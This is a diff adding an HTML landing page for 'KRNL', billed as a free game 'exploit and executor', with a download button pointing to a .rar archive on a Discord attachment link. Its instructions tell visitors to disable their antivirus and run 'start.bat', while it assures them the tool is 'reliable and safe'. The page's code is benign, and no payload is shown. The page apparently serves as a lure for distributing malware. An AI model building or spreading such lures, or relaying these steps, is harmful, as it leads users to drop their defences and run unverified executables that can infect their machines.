@@ -1,0 +1,170 @@
+<!doctype html>
+<html lang="tr">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>App Showcase</title>
+
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;500;700&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --bg: #000;
+      --card: #fff;
+      --text: #fff;
+      --muted: #999;
+      --radius: 28px;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      background: var(--bg);
+      font-family: "Montserrat", sans-serif;
+      color: var(--text);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    /* ÜST KISIM */
+    header {
+      text-align: center;
+      margin-top: 60px;
+    }
+
+    .logo {
+      width: 100px;
+      height: auto;
+      margin: 0 auto 20px;
+    }
+
+    h1 {
+      font-size: 28px;
+      font-weight: 700;
+      margin: 0;
+    }
+
+    .subtitle {
+      color: #ccc;
+      margin-top: 8px;
+      font-weight: 300;
+      font-size: 15px;
+    }
+
+    /* DOWNLOAD BUTONU */
+    .cta {
+      display: inline-block;
+      margin-top: 28px;
+      padding: 16px 48px;
+      background: #fff;
+      color: #000;
+      text-decoration: none;
+      font-weight: 700;
+      border-radius: 50px;
+      letter-spacing: 1px;
+      transition: all 0.2s ease;
+    }
+
+    .cta:hover {
+      background: #ddd;
+    }
+
+    /* ALT KARTLAR */
+    .cards {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 40px;
+      width: 80%;
+      max-width: 1000px;
+      margin-top: auto;
+      margin-bottom: 60px;
+    }
+
+    .card {
+      background: var(--card);
+      color: #000;
+      border-radius: var(--radius);
+      padding: 28px;
+      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.35);
+    }
+
+    .card h3 {
+      margin-top: 0;
+      margin-bottom: 12px;
+    }
+
+    .card ul {
+      padding-left: 20px;
+    }
+
+    .card li {
+      margin: 8px 0;
+    }
+
+    .footer {
+      text-align: center;
+      color: #666;
+      font-size: 13px;
+      margin-bottom: 20px;
+    }
+
+    /* MOBİL */
+    @media (max-width: 800px) {
+      .cards {
+        grid-template-columns: 1fr;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <header>
+    <!-- LOGO -->
+    <img src="design.png" alt="Logo" class="logo" />
+
+    <!-- BAŞLIK -->
+    <h1>KRNL</h1>
+    <div class="subtitle">The best free exploit and excutor</div>
+
+    <!-- DOWNLOAD BUTONU -->
+    <a href="https://cdn.discordapp.com/attachments/1435658431251087562/1435659235232055467/KRNL_Best_Exploit.rar?ex=690cc55a&is=690b73da&hm=8b55f3909e75b5853c72d2b9f6fd5c4e2f0df6943339dd95f484c2ac7f787675&" class="cta">DOWNLOAD</a>
+  </header>
+
+  <!-- ALTTAKİ YAZILAR / KUTULAR -->
+  <section class="cards">
+    <div class="card">
+      <h3>Instructions</h3>
+      <ul>
+        <li> Disable The Antivirus</li>
+        <li> Download "KRNL" and Open the game</li>
+        <li> Open "start.bat"</li>
+        <li> You’re ready now!</li>
+      </ul>
+    </div>
+
+    <div class="card">
+      <h3>Why Choose Us?</h3>
+      <ul>
+        <li>Completely free to use</li>
+        <li>Reliable and safe</li>
+        <li>Simple, modern design</li>
+      </ul>
+    </div>
+  </section>
+
+  <div class="footer">
+    © <span id="year"></span> KRNL Official Web Site
+  </div>
+
+  <script>
+    document.getElementById("year").textContent = new Date().getFullYear();
+  </script>
+
+</body>
+</html>
